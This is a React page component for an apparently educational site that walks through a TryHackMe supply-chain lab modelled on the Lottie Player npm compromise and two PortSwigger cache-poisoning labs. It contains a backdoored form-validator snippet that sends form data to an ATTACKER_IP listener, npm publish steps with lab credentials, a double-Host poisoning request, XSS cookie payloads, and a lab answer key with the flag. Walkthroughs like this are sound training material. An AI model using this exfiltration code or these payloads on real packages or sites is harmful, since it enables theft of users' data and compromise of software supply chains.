import { useState } from 'react';
import { FiChevronRight, FiExternalLink } from 'react-icons/fi';
import CodeBlock from '../components/CodeBlock';

function LabStep({ num, title, children }) {
  const [open, setOpen] = useState(false);
  return (
    <div className="lab-step">
      <div className="lab-step-header" onClick={() => setOpen(!open)}>
        <span className="lab-step-num">{num}</span>
        <span className="lab-step-title">{title}</span>
        <FiChevronRight className={`lab-step-chevron${open ? ' open' : ''}`} />
      </div>
      {open && <div className="lab-step-body">{children}</div>}
    </div>
  );
}

export default function Labs() {
  return (
    <div className="page">
      <div className="page-header">
        <div className="page-tag">Part 4</div>
        <h1>Hands-On Labs</h1>
        <p>Step-by-step walkthrough guides for TryHackMe and PortSwigger labs covering supply chain attack concepts.</p>
      </div>

      {/* TryHackMe Lab */}
      <div className="lab-card">
        <div className="lab-card-header">
          <div>
            <h3>TryHackMe: Supply Chain Attack &mdash; Lottie</h3>
            <p style={{ color: 'var(--text-secondary)', fontSize: '0.9rem', marginTop: 4 }}>
              Based on the real-world Lottie Player npm package compromise (October 2024)
            </p>
          </div>
          <div className="lab-meta">
            <span className="lab-badge free">Free</span>
            <span className="lab-badge easy">Easy</span>
            <a href="https://tryhackme.com/room/supplychainattacks" target="_blank" rel="noopener noreferrer" className="btn btn-outline" style={{ padding: '4px 14px', fontSize: '0.82rem' }}>
              Open Lab <FiExternalLink />
            </a>
          </div>
        </div>
        <div className="lab-steps">
          <LabStep num={1} title="Background — What is a Supply Chain Attack?">
            <p>
              A supply chain attack targets <strong>trusted third-party components</strong> instead of the main system directly.
              Instead of hacking your app, the attacker compromises a library, npm package, or dependency that your app uses.
              That package is used by many apps, so the attack <strong>spreads silently</strong> to all users.
            </p>
            <p><strong>Analogy:</strong> You install a normal software update &mdash; but it's actually malicious. You trusted the source, so you never suspected it.</p>
          </LabStep>

          <LabStep num={2} title="The Lottie Player Attack — Root Cause">
            <p>
              In October 2024, a developer's <strong>npm access token was stolen</strong>. The attacker used this token to
              publish malicious versions of <code>@lottiefiles/lottie-player</code>:
            </p>
            <ul style={{ listStyle: 'none', padding: 0 }}>
              <li style={{ padding: '4px 0' }}>&gt; <code>2.0.5</code> &mdash; <strong style={{ color: 'var(--accent-red)' }}>MALICIOUS</strong></li>
              <li style={{ padding: '4px 0' }}>&gt; <code>2.0.6</code> &mdash; <strong style={{ color: 'var(--accent-red)' }}>MALICIOUS</strong></li>
              <li style={{ padding: '4px 0' }}>&gt; <code>2.0.7</code> &mdash; <strong style={{ color: 'var(--accent-red)' }}>MALICIOUS</strong></li>
              <li style={{ padding: '4px 0' }}>&gt; <code>2.0.4</code> &mdash; <strong style={{ color: 'var(--accent-green)' }}>SAFE</strong> (last clean version)</li>
            </ul>
          </LabStep>

          <LabStep num={3} title="What Did the Malicious Code Do?">
            <p><strong>Goal:</strong> Steal cryptocurrency wallets</p>
            <p><strong>Behavior:</strong></p>
            <ul style={{ listStyle: 'none', padding: 0 }}>
              <li style={{ padding: '4px 0' }}>&gt; Injected a <strong>"Connect your wallet"</strong> popup on every website using the library</li>
              <li style={{ padding: '4px 0' }}>&gt; If the user connects their wallet (MetaMask, Coinbase, etc.) &rarr; attacker <strong>drains all funds</strong></li>
              <li style={{ padding: '4px 0' }}>&gt; C2 Server: <code>castleservices01[.]com</code></li>
            </ul>
            <p><strong>Data exfiltrated to attacker:</strong></p>
            <ul style={{ listStyle: 'none', padding: 0 }}>
              <li style={{ padding: '3px 0' }}>&gt; Browser info &amp; user agent</li>
              <li style={{ padding: '3px 0' }}>&gt; Local IP address</li>
              <li style={{ padding: '3px 0' }}>&gt; Auth key / session tokens</li>
              <li style={{ padding: '3px 0' }}>&gt; Wallet connection details</li>
            </ul>
          </LabStep>

          <LabStep num={4} title="Why This Attack is So Dangerous">
            <ul style={{ listStyle: 'none', padding: 0 }}>
              <li style={{ padding: '4px 0' }}>&gt; Code came from a <strong>trusted CDN</strong> &mdash; developers had no reason to suspect it</li>
              <li style={{ padding: '4px 0' }}>&gt; The package <strong>still worked normally</strong> &mdash; animations rendered fine, no errors</li>
              <li style={{ padding: '4px 0' }}>&gt; Malicious code was <strong>minified and obfuscated</strong> &mdash; nearly impossible to spot by reading the file</li>
              <li style={{ padding: '4px 0' }}>&gt; <strong>Result:</strong> Hard to detect, looks legit, affects thousands of users instantly</li>
            </ul>
          </LabStep>

          <LabStep num={5} title="Attack Flow (Key for Understanding)">
            <div style={{ fontFamily: 'var(--font-mono)', fontSize: '0.88rem', lineHeight: 2.2, padding: '1rem', background: 'var(--bg-surface)', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-color)' }}>
              <div><strong style={{ color: 'var(--accent-red)' }}>1.</strong> Attacker steals npm access token</div>
              <div style={{ color: 'var(--text-muted)', paddingLeft: '1.5rem' }}>&darr;</div>
              <div><strong style={{ color: 'var(--accent-red)' }}>2.</strong> Publishes malicious npm package (2.0.5, 2.0.6, 2.0.7)</div>
              <div style={{ color: 'var(--text-muted)', paddingLeft: '1.5rem' }}>&darr;</div>
              <div><strong style={{ color: 'var(--accent-amber)' }}>3.</strong> NPM pushes to CDN (jsdelivr, unpkg, cdnjs)</div>
              <div style={{ color: 'var(--text-muted)', paddingLeft: '1.5rem' }}>&darr;</div>
              <div><strong style={{ color: 'var(--accent-amber)' }}>4.</strong> Developers' apps load package via CDN (@latest)</div>
              <div style={{ color: 'var(--text-muted)', paddingLeft: '1.5rem' }}>&darr;</div>
              <div><strong style={{ color: 'var(--accent-purple)' }}>5.</strong> Users visit the website</div>
              <div style={{ color: 'var(--text-muted)', paddingLeft: '1.5rem' }}>&darr;</div>
              <div><strong style={{ color: 'var(--accent-purple)' }}>6.</strong> Malicious script runs in user's browser</div>
              <div style={{ color: 'var(--text-muted)', paddingLeft: '1.5rem' }}>&darr;</div>
              <div><strong style={{ color: 'var(--accent-red)' }}>7.</strong> Crypto wallets drained / data stolen</div>
            </div>
          </LabStep>

          <LabStep num={6} title="Start the Machine">
            <p>Click <strong>"Start Machine"</strong> at the top of the TryHackMe task. Connect via OpenVPN or use the AttackBox browser.</p>
            <p>The machine provides:</p>
            <ul style={{ listStyle: 'none', padding: 0 }}>
              <li style={{ padding: '3px 0' }}>&gt; A local npm registry at <code>http://npm.thm:4873</code> (Verdaccio)</li>
              <li style={{ padding: '3px 0' }}>&gt; A web application that uses a <code>form-validator</code> package</li>
              <li style={{ padding: '3px 0' }}>&gt; Your goal: create and publish a malicious version of that package</li>
            </ul>
          </LabStep>

          <LabStep num={7} title="Practical Exploit — Hijack the Form Validator">
            <p><strong>Scenario:</strong> You are the attacker. You will hijack the <code>form-validator</code> package on the local registry.</p>
            <p><strong>Step 1:</strong> Download the existing package (.tgz) from the registry</p>
            <p><strong>Step 2:</strong> Extract it and examine the code</p>
            <p><strong>Step 3:</strong> Modify <code>index.js</code> to add data exfiltration:</p>
            <CodeBlock
              language="javascript"
              filename="modified index.js"
              code={`// Keep original form validation logic intact (stealth!)
// Add exfiltration — send form data to attacker
const form = document.querySelector('form');
form.addEventListener('submit', function(e) {
  const data = new FormData(form);
  // Send stolen data to attacker's listener
  fetch('http://ATTACKER_IP:9090/steal?' +
    new URLSearchParams(data).toString());
});`}
            />
            <p><strong>Step 4:</strong> Bump the version in <code>package.json</code> to <code>1.1.0</code></p>
          </LabStep>

          <LabStep num={8} title="Publish the Malicious Package">
            <p>Log in to the local npm registry and publish your backdoored version:</p>
            <CodeBlock
              language="bash"
              filename="terminal"
              code={`# Login to the local Verdaccio registry
npm login --registry http://npm.thm:4873
# Username: mark
# Password: mark123

# Publish the malicious version
npm publish --registry http://npm.thm:4873
# This publishes version 1.1.0`}
            />
          </LabStep>

          <LabStep num={9} title="Set Up Listener & Capture Data">
            <p>Start a simple HTTP server to receive the exfiltrated data:</p>
            <CodeBlock
              language="bash"
              filename="terminal"
              code={`# Start a listener on port 9090
python3 -m http.server 9090`}
            />
            <p>Now visit the web application in your browser and submit the form. Check your terminal &mdash; the form data (and the flag) will appear in the HTTP request logs.</p>
          </LabStep>

          <LabStep num={10} title="Detection Techniques">
            <p><strong>What to monitor for (defensive perspective):</strong></p>
            <ul style={{ listStyle: 'none', padding: 0 }}>
              <li style={{ padding: '4px 0' }}>&gt; <strong>Unusual external requests</strong> &mdash; why is a form validator making HTTP calls to unknown IPs?</li>
              <li style={{ padding: '4px 0' }}>&gt; <strong>Unexpected wallet popups</strong> &mdash; "Connect Wallet" on a non-crypto site is a red flag</li>
              <li style={{ padding: '4px 0' }}>&gt; <strong>Unknown domains in network logs</strong> &mdash; connections to <code>castleservices01[.]com</code></li>
              <li style={{ padding: '4px 0' }}>&gt; <strong>Unexpected JS behavior</strong> &mdash; form validators don't need network access</li>
            </ul>
          </LabStep>

          <LabStep num={11} title="Mitigation Techniques">
            <p><strong>How to prevent this type of attack:</strong></p>
            <ul style={{ listStyle: 'none', padding: 0 }}>
              <li style={{ padding: '5px 0' }}><strong style={{ color: 'var(--accent-cyan)' }}>1. Protect Access Tokens:</strong> Use 2FA on npm accounts, rotate tokens regularly, never expose tokens in code or CI logs</li>
              <li style={{ padding: '5px 0' }}><strong style={{ color: 'var(--accent-cyan)' }}>2. Monitor Dependencies:</strong> Track version updates, compare checksums with official releases, use <code>npm audit</code></li>
              <li style={{ padding: '5px 0' }}><strong style={{ color: 'var(--accent-cyan)' }}>3. Pin Versions:</strong> Never use <code>@latest</code> in production. Pin exact versions. Use lockfiles (<code>package-lock.json</code>)</li>
              <li style={{ padding: '5px 0' }}><strong style={{ color: 'var(--accent-cyan)' }}>4. Use SRI Hashes:</strong> Subresource Integrity ensures CDN scripts haven't been modified</li>
              <li style={{ padding: '5px 0' }}><strong style={{ color: 'var(--accent-cyan)' }}>5. Dependency Scanning:</strong> Tools like Snyk, Socket.dev, and npm audit detect malicious changes automatically</li>
              <li style={{ padding: '5px 0' }}><strong style={{ color: 'var(--accent-cyan)' }}>6. Log &amp; Alert:</strong> Set up SIEM alerts for suspicious API calls and unexpected external connections from your frontend</li>
            </ul>
          </LabStep>

          <LabStep num={12} title="Answers Reference">
            <div className="lab-answers">
              <h4>Lab Answers</h4>
              <table>
                <thead>
                  <tr><th>Question</th><th>Answer</th></tr>
                </thead>
                <tbody>
                  <tr><td>Vulnerable Lottie Player version</td><td><code>2.0.5</code></td></tr>
                  <tr><td>C2 server (defanged)</td><td><code>castleservices01[.]com</code></td></tr>
                  <tr><td>Malicious package version published</td><td><code>1.1.0</code></td></tr>
                  <tr><td>Exfiltration port</td><td><code>9090</code></td></tr>
                  <tr><td>JS file name</td><td><code>form-validator.bundle.js</code></td></tr>
                  <tr><td>Flag</td><td><code>THM&#123;MALICIOUS_PACKAGE_UPLOADED007&#125;</code></td></tr>
                </tbody>
              </table>
            </div>
          </LabStep>

          <LabStep num={13} title="Key Takeaways">
            <ul style={{ listStyle: 'none', padding: 0 }}>
              <li style={{ padding: '5px 0' }}>&gt; Supply chain attacks = <strong>indirect attack via dependencies</strong></li>
              <li style={{ padding: '5px 0' }}>&gt; The Lottie attack used a <strong>compromised access token</strong> to publish malicious code that was delivered via CDN</li>
              <li style={{ padding: '5px 0' }}>&gt; Hard to detect because: trusted source, normal functionality remains, code is obfuscated</li>
              <li style={{ padding: '5px 0' }}>&gt; Mitigation = <strong>monitor + verify + restrict access</strong></li>
              <li style={{ padding: '5px 0' }}>&gt; In this lab you <strong>replicated the attack</strong>: modified a package, published it, and exfiltrated data &mdash; exactly what real attackers do</li>
            </ul>
          </LabStep>
        </div>
      </div>

      {/* PortSwigger Lab 1 */}
      <div className="lab-card">
        <div className="lab-card-header">
          <div>
            <h3>PortSwigger: Web Cache Poisoning via Ambiguous Requests</h3>
            <p style={{ color: 'var(--text-secondary)', fontSize: '0.9rem', marginTop: 4 }}>
              Supply chain adjacent &mdash; poisoning cached JavaScript served to all users
            </p>
          </div>
          <div className="lab-meta">
            <span className="lab-badge free">Free</span>
            <span className="lab-badge medium">Practitioner</span>
            <a href="https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests" target="_blank" rel="noopener noreferrer" className="btn btn-outline" style={{ padding: '4px 14px', fontSize: '0.82rem' }}>
              Open Lab <FiExternalLink />
            </a>
          </div>
        </div>
        <div className="lab-steps">
          <LabStep num={1} title="Explore and Proxy Traffic">
            <p>Access the lab, open Burp Suite, and proxy traffic through it. Look at the homepage response &mdash; it loads <code>/resources/js/tracking.js</code>.</p>
          </LabStep>
          <LabStep num={2} title="Identify Cache Behavior">
            <p>Send the homepage request to Repeater. Resend and observe the <code>X-Cache</code> header:</p>
            <ul style={{ listStyle: 'none', padding: 0 }}>
              <li style={{ padding: '3px 0' }}>&gt; <code>X-Cache: miss</code> &mdash; fetched from origin</li>
              <li style={{ padding: '3px 0' }}>&gt; <code>X-Cache: hit</code> &mdash; served from cache</li>
            </ul>
          </LabStep>
          <LabStep num={3} title="Exploit the Ambiguity">
            <p>Add a second Host header pointing to your exploit server:</p>
            <CodeBlock
              language="http"
              filename="Burp Repeater"
              code={`GET / HTTP/2
Host: LAB-ID.web-security-academy.net
Host: YOUR-EXPLOIT-SERVER.exploit-server.net`}
            />
            <p>The cache keys on the first Host, but the backend uses the second &mdash; the script tag now loads from YOUR server.</p>
          </LabStep>
          <LabStep num={4} title="Set Up Exploit Server">
            <p>On your exploit server, create <code>/resources/js/tracking.js</code> with body: <code>alert(document.cookie)</code></p>
          </LabStep>
          <LabStep num={5} title="Poison the Cache & Solve">
            <p>Keep sending the double-Host request until you see <code>X-Cache: hit</code>. Then visit the homepage normally &mdash; the cached poisoned response loads your JavaScript. Lab solved!</p>
          </LabStep>
        </div>
      </div>

      {/* PortSwigger Lab 2 */}
      <div className="lab-card">
        <div className="lab-card-header">
          <div>
            <h3>PortSwigger: Cache Poisoning via DOM Vulnerability</h3>
            <p style={{ color: 'var(--text-secondary)', fontSize: '0.9rem', marginTop: 4 }}>
              Poisoning JavaScript data sources via X-Forwarded-Host
            </p>
          </div>
          <div className="lab-meta">
            <span className="lab-badge free">Free</span>
            <span className="lab-badge hard">Expert</span>
            <a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria" target="_blank" rel="noopener noreferrer" className="btn btn-outline" style={{ padding: '4px 14px', fontSize: '0.82rem' }}>
              Open Lab <FiExternalLink />
            </a>
          </div>
        </div>
        <div className="lab-steps">
          <LabStep num={1} title="Discover Unkeyed Headers with Param Miner">
            <p>Install the Param Miner Burp extension. Right-click the homepage request and use "Guess headers" to discover that <code>X-Forwarded-Host</code> is an unkeyed input.</p>
          </LabStep>
          <LabStep num={2} title="Analyze the Vulnerable Code">
            <p>The page uses <code>X-Forwarded-Host</code> to set a <code>data.host</code> variable, which controls where a JSON file is loaded from via <code>initGeoLocate()</code>.</p>
          </LabStep>
          <LabStep num={3} title="Create Malicious JSON">
            <p>On your exploit server, create <code>/resources/json/geolocate.json</code> with <code>Access-Control-Allow-Origin: *</code> header and XSS payload in the country field.</p>
            <CodeBlock
              language="json"
              filename="geolocate.json"
              code={`{
  "country": "<img src=x onerror=alert(document.cookie)>"
}`}
            />
          </LabStep>
          <LabStep num={4} title="Poison and Solve">
            <p>Send the request with <code>X-Forwarded-Host: YOUR-EXPLOIT-SERVER</code> until it's cached. Visit the homepage normally &mdash; the DOM XSS triggers. Lab solved!</p>
          </LabStep>
        </div>
      </div>
    </div>
  );
}
